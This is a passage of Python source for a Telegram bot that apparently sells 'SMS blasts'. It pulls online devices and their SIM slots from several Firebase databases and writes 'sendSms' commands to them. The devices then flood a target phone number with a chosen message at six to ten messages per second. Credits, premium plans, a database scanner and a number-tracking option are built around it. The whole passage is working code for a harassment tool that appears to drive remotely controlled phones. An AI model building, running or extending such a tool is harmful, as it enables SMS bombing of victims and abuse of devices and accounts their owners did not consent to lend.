                        url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with _dev_sem:
                            async with http.get(url, timeout=aiohttp.ClientTimeout(total=6)) as r2:
                                if r2.status == 200:
                                    txt2 = (await r2.text()).strip()
                                    if txt2 == "null" or not txt2:
                                        return None
                                    dev_data = json.loads(txt2)
                                    if isinstance(dev_data, dict) and device_is_online(dev_data):
                                        name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                        sims = dev_data.get("sims", [])
                                        return {
                                            "fb_id": fb["id"],
                                            "fb_url": fb["url"],
                                            "fb_label": fb.get("label", fb["url"][:30]),
                                            "dev_id": dev_id,
                                            "dev_name": name,
                                            "sims": sims,
                                        }
                    except Exception:
                        return None
                    return None

                dev_ids = list(device_ids.keys())
                for i in range(0, len(dev_ids), 25):
                    batch = dev_ids[i : i + 25]
                    dev_results = await asyncio.gather(*(fetch_dev(did) for did in batch))
                    for res in dev_results:
                        if res:
                            results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(http: aiohttp.ClientSession, fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put_real(
        http,
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time()),
        },
    )

# ========== FORCE JOIN & PANELS ==========
async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    missing = []
    for ch in fj.get("channels", []):
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:",
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = [[btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="success")] for ch in missing]
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    is_prem = has_active_premium(uid, d)
    usage_str = "∞ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴘʟᴀɴ ᴀᴄᴛɪᴠᴇ)" if (is_prem or is_admin(uid, d)) else f"{credits} ᴄʀᴇᴅɪᴛs"
    scan_info = get_scan_status()

    return (
        f"╔══════════════════════╗\n"
        f"  {em(EMOJI_PHONE, '📱')} <b>{_VERSION}</b>\n"
        f"╚══════════════════════╝\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME} | <b>Credits:</b> {CREDIT_CONTACT_HANDLE}\n\n"
        f"{em(EMOJI_CROWN, '👑')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_ROCKET, '⚡')} ᴜsᴀɢᴇ   : <b>{usage_str}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤", style="success"), btn("ᴘɪɴɢ", "util:ping", EMOJI_ROCKET, "⚡", style="primary")],
            [btn("ᴄʀᴇᴅɪᴛs & ᴘʟᴀɴ", "user:credits", EMOJI_MONEY, "💳", style="primary"), btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁", style="primary")],
            [btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥", style="primary"), btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊", style="primary")],
            [btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_GEAR, "📜", style="primary"), btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰", style="success")],
            [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸", style="primary"), btn("📹 ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹", style="primary")],
            [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️", style="primary")],
        ]
    )

def unified_admin_panel_text(d: dict, is_full_owner: bool) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    banned = d.get("banned", [])
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴘʀᴇᴍɪᴜᴍ/ᴄʀᴇᴅɪᴛ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    ab = d.get("auto_broadcast", {})
    ab_iv = fmt_interval_label(ab.get("interval_minutes", 5))
    ab_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ ({ab_iv})" if ab.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ ({ab_iv})"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    active_prem = sum(1 for u_id in users if has_active_premium(int(u_id), d))

    title = "ᴏᴡɴᴇʀ & ᴀᴅᴍɪɴ ʜᴜʙ" if is_full_owner else "ᴀᴅᴍɪɴ ᴄᴏɴᴛʀᴏʟ ʜᴜʙ"
    return (
        f"╔══════════════════════╗\n"
        f"  {em(EMOJI_CROWN if is_full_owner else EMOJI_SHIELD, '👑' if is_full_owner else '🛡')} <b>{sc(title)}</b>\n"
        f"  <b>{_VERSION}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{em(EMOJI_STAR, '👥')} ᴜsᴇʀs        : <b>{len(users)}</b> (💎 {active_prem} ᴘʀᴇᴍɪᴜᴍ)\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ       : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} ᴏᴡɴᴇʀs/ᴀᴅᴍɪɴ : <b>{len(owners)}</b> / <b>{len(admins)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs       : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} sᴇɴᴛ / ғᴀɪʟ  : <b>{stats.get('total_sent', 0)}</b> / <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ ʙʟᴀsᴛ : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ  : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ   : {fj_status}\n"
        f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ ɴᴏᴛɪғ   : {ab_status}\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ    : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ      : {get_scan_status()}"
    )

def unified_admin_kb(d: dict, is_full_owner: bool) -> InlineKeyboardMarkup:
    mode_btn = (
        btn("ғʀᴇᴇ ᴍᴏᴅᴇ: ᴏɴ (ᴛᴀᴘ ᴏғғ)", "owner:free:off", EMOJI_CHECK, "🟢", style="success")
        if d.get("free_mode")
        else btn("ғʀᴇᴇ ᴍᴏᴅᴇ: ᴏғғ (ᴛᴀᴘ ᴏɴ)", "owner:free:on", EMOJI_CROSS, "🔴", style="danger")
    )
    rows = [
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "🚀", style="success"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="primary")],
        [btn("sᴇᴛ ᴀᴜᴛᴏ ᴍsɢ", "owner:autonotif:set", EMOJI_BELL, "🔔", style="primary"), btn("sᴛᴀʀᴛ ᴀᴜᴛᴏ ᴍsɢ", "owner:autonotif:on", EMOJI_CHECK, "🟢", style="success")],
        [btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"), btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary"), btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜", style="primary"), btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎟", style="primary"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "✂️", style="danger"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_GIFT, "🎁", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "🧹", style="danger"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="primary")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "💾", style="primary"), btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍ", "owner:protect", EMOJI_LOCK, "🔒", style="primary")],
        [btn("ɢɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ", "admin:give_prem", EMOJI_CROWN, "💎", style="success"), btn("ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs", "admin:prem_plans", EMOJI_MONEY, "🏷", style="primary")],
        [btn("ᴀᴅᴅ ᴅᴀᴛᴀʙᴀsᴇ", "admin:db:add", EMOJI_CHECK, "📥", style="primary"), btn("ᴇxᴘᴏʀᴛ ᴅᴀᴛᴀʙᴀsᴇs", "admin:db:export", EMOJI_GEAR, "📤", style="primary")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"), btn("ᴛʀᴀᴄᴋ ɴᴜᴍ", "owner:track", EMOJI_STAR, "🕵️", style="primary")],
        [btn("ᴀᴜᴛᴏ ɴᴏᴛɪғ ᴍᴇɴᴜ", "owner:autonotif:menu", EMOJI_GEAR, "🔄", style="primary"), btn("ᴘɪɴɢ", "util:ping", EMOJI_ROCKET, "⚡", style="primary")],
        [mode_btn, btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

R = Router()

# ========== START, PING, FORCE JOIN ==========
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = (msg.text or "").split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF") and not d["users"].get(str(uid), {}).get("referred_by"):
        success, _, referrer = process_referral(uid, code, d)
        if success and referrer:
            try:
                ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                await msg.bot.send_message(
                    referrer,
                    f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                    f"{em(EMOJI_MONEY, '💰')} +{d['settings']['ref_credits']} credits mile hain.",
                    parse_mode="HTML",
                )
            except Exception:
                pass
    save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome!\nOwner: {SUPER_ADMIN_NAME}")
    if is_banned(uid, d) and not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(unified_admin_panel_text(d, is_owner(uid, d)), reply_markup=unified_admin_kb(d, is_owner(uid, d)), parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome!\nOwner: {SUPER_ADMIN_NAME}")
    if is_banned(uid, d) and not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(unified_admin_panel_text(d, is_owner(uid, d)), reply_markup=unified_admin_kb(d, is_owner(uid, d)), parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "util:ping")
async def cb_ping(cq: CallbackQuery):
    t0 = time.perf_counter()
    await cq.answer("⚡ Pinging...")
    cb_ms = (time.perf_counter() - t0) * 1000
    t1 = time.perf_counter()
    try:
        await cq.bot.get_me()
    except Exception:
        pass
    api_ms = (time.perf_counter() - t1) * 1000
    await cq.message.answer(
        f"╔══════════════════════╗\n"
        f"  {em(EMOJI_ROCKET, '⚡')} <b>{sc('pong • latency')}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{em(EMOJI_CHECK, '🟢')} <b>Callback Ping :</b> <code>{cb_ms:.1f} ms</code>\n"
        f"{em(EMOJI_GEAR, '📡')} <b>Telegram API  :</b> <code>{api_ms:.1f} ms</code>\n"
        f"{em(EMOJI_PHONE, '📱')} <b>Online Devs   :</b> <code>{len(CACHED_DEVICES)}</code>",
        parse_mode="HTML",
    )

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    if is_admin(uid, d):
        await cq.message.answer(unified_admin_panel_text(d, is_owner(uid, d)), reply_markup=unified_admin_kb(d, is_owner(uid, d)), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ========== USER & ADMIN LIVE STEP-BY-STEP SMS BLAST ==========
async def _start_sms_wizard(cq: CallbackQuery, state: FSMContext, is_admin_flow: bool):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access/Credits/Premium required!", show_alert=True)
        return

    await state.set_state(S.admin_send_number if is_admin_flow else S.send_number)
    cancel_cb = "admin:home" if is_admin_flow else "user:home"
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4 — target number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", cancel_cb)]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    await _start_sms_wizard(cq, state, is_admin_flow=False)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await _start_sms_wizard(cq, state, is_admin_flow=True)

async def _handle_number_input(msg: Message, state: FSMContext, is_admin_flow: bool):
    number = (msg.text or "").strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS and not is_owner(msg.from_user.id, load()):
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message if is_admin_flow else S.send_message)
    cancel_cb = "admin:home" if is_admin_flow else "user:home"
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Target: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4 — message')}</b>\n\nJo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", cancel_cb)]),
        parse_mode="HTML",
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    await _handle_number_input(msg, state, is_admin_flow=False)

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    await _handle_number_input(msg, state, is_admin_flow=True)

async def _handle_message_input(msg: Message, state: FSMContext, is_admin_flow: bool):
    await state.update_data(message=(msg.text or "").strip())
    await state.set_state(S.admin_send_speed if is_admin_flow else S.send_speed)
    prefix = "admin" if is_admin_flow else "user"
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4 — speed')}</b>\n\nSending speed select karein (6 se 10/sec):",
        reply_markup=speed_kb(prefix),
        parse_mode="HTML",
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await _handle_message_input(msg, state, is_admin_flow=False)

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await _handle_message_input(msg, state, is_admin_flow=True)

async def _handle_speed_select(cq: CallbackQuery, state: FSMContext, is_admin_flow: bool):
    d = load()
    uid = cq.from_user.id
    data_key = cq.data.split(":")[-1]
    speed_map = {"fast": SPEED_FAST, "medium": SPEED_MEDIUM, "slow": SPEED_SLOW}
    selected_speed = speed_map.get(data_key, SPEED_FAST)
    label_map = {"fast": "🚀 FAST (~9/s)", "medium": "⚡ MEDIUM (~7/s)", "slow": "🐢 SLOW (~6/s)"}

    await state.update_data(send_speed=selected_speed, speed_label=label_map.get(data_key, "🚀 FAST (~9/s)"))
    await state.set_state(S.admin_send_count if is_admin_flow else S.send_count)

    devices = get_cached_devices() or await get_all_online_devices(d)
    unlimited = is_admin(uid, d) or has_active_premium(uid, d)
    limit_line = ""
    if not unlimited:
        limit_line = f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{get_user_credits(uid, d)}</b>\n"

    cancel_cb = "admin:home" if is_admin_flow else "user:home"
    await cq.message.edit_text(
        f"<b>{label_map.get(data_key)}</b> selected!\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4 — count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{len(devices)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Capacity    : <b>{len(devices) * 4}</b> SMS{limit_line}\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", cancel_cb)]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    await _handle_speed_select(cq, state, is_admin_flow=False)

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    await _handle_speed_select(cq, state, is_admin_flow=True)

async def _handle_count_input(msg: Message, state: FSMContext, is_admin_flow: bool):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int((msg.text or "").strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf valid number bhejo (e.g. 100):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_FAST)
    speed_label = fsmd.get("speed_label", "🚀 FAST (~9/s)")

    unlimited = is_admin(uid, d) or has_active_premium(uid, d)
    if not unlimited:
        creds = get_user_credits(uid, d)
        if creds <= 0:
            await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>Credits khatam ho gaye!</b>", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML")
            return
        if count > creds:
            count = creds

    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        back_cb = "admin:home" if is_admin_flow else "user:home"
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi device online nahi hai!", reply_markup=kb([("ʙᴀᴄᴋ", back_cb)]), parse_mode="HTML")
        return

    await run_monster_sms_blast(msg.bot, msg, uid, number, message_text, count, devices, send_speed, speed_label, unlimited)

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    await _handle_count_input(msg, state, is_admin_flow=False)

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    await _handle_count_input(msg, state, is_admin_flow=True)

async def run_monster_sms_blast(
    bot: Bot,
    msg: Message,
    uid: int,
    number: str,
    message: str,
    count: int,
    devices: list[dict],
    speed: float,
    speed_label: str,
    unlimited: bool,
):
    async with SESSIONS_LOCK:
        existing = USER_SESSIONS.get(uid)
        if existing and existing.task and not existing.task.done():
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Ek blast pehle se chal raha hai!", parse_mode="HTML")
            return
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    credits_disp = None if unlimited else get_user_credits(uid, load())
    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, number, credits_disp, speed_label, paused=False),
            reply_markup=active_send_kb(paused=False),
            parse_mode="HTML",
        )
    except Exception as e:
        log.error(f"Progress send failed: {e}")
        async with SESSIONS_LOCK:
            USER_SESSIONS.pop(uid, None)
        return

    queue_items: list[tuple[str, str, str]] = []
    for dev in devices:
        sims = dev.get("sims") or []
        slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
        for _ in slots:
            queue_items.append((dev["fb_id"], dev["fb_url"], dev["dev_id"]))
            if len(queue_items) >= count * 2:
                break
        if len(queue_items) >= count * 2:
            break

    if not queue_items:
        queue_items = [(devices[0]["fb_id"], devices[0]["fb_url"], devices[0]["dev_id"])]

    http = await get_http()
    # Keep concurrency capped around 4-6 so effective pace stays ~6-10/s and doesn't fake/drop under overload
    concurrency = 5 if speed <= SPEED_FAST else (4 if speed <= SPEED_MEDIUM else 3)
    sem = asyncio.Semaphore(concurrency)

    sent_ok = 0
    sent_fail = 0
    api_usage_delta: dict[str, dict[str, int]] = {}
    last_edit = 0.0
    last_rendered_done = -1
    start_time = time.time()
    idx = 0

    async def fire_one(fb_id: str, fb_url: str, dev_id: str, slot: int):
        nonlocal sent_ok, sent_fail
        async with sem:
            ok = await send_sms_via_device(http, fb_url, dev_id, slot, number, message)
            async with session.lock:
                if ok:
                    sent_ok += 1
                else:
                    sent_fail += 1
                session.sent = sent_ok
                session.failed = sent_fail
                bucket = api_usage_delta.setdefault(fb_id, {"sent": 0, "failed": 0})
                bucket["sent" if ok else "failed"] += 1

    async def flush_progress(force: bool = False):
        nonlocal last_edit, last_rendered_done
        done_now = sent_ok + sent_fail
        now = time.time()
        if not force:
            if done_now == last_rendered_done:
                return
            if (now - last_edit) < _PROGRESS_UPDATE_INTERVAL and done_now < count:
                return
        rem_c = None if unlimited else get_user_credits(uid, load())
        try:
            await progress_msg.edit_text(
                progress_text(sent_ok, sent_fail, count, number, rem_c, speed_label, paused=session.paused),
                reply_markup=active_send_kb(paused=session.paused) if not session.cancelled else None,
                parse_mode="HTML",
            )
            last_edit = now
            last_rendered_done = done_now
        except TelegramBadRequest:
            pass
        except Exception:
            pass

    async def worker_loop():
        nonlocal idx
        in_flight: set[asyncio.Task] = set()
        try:
            while idx < count or in_flight:
                async with session.lock:
                    if session.cancelled:
                        break
                    is_paused = session.paused

                if is_paused:
                    await flush_progress(force=True)
                    await asyncio.sleep(0.15)
                else:
                    while idx < count and len(in_flight) < concurrency:
                        async with session.lock:
                            if session.cancelled or session.paused:
                                break
                        fb_id, fb_url, dev_id = queue_items[idx % len(queue_items)]
                        slot = idx % 2
                        idx += 1
                        t = asyncio.create_task(fire_one(fb_id, fb_url, dev_id, slot))
                        in_flight.add(t)
                        t.add_done_callback(in_flight.discard)
                        await asyncio.sleep(speed)

                if in_flight:
                    done, _ = await asyncio.wait(in_flight, timeout=0.15, return_when=asyncio.FIRST_COMPLETED)
                    in_flight.difference_update(done)

                await flush_progress(force=False)

            if in_flight:
                await asyncio.gather(*in_flight, return_exceptions=True)
            await flush_progress(force=True)
        except Exception as e:
            log.error(f"Blast loop error: {e}")

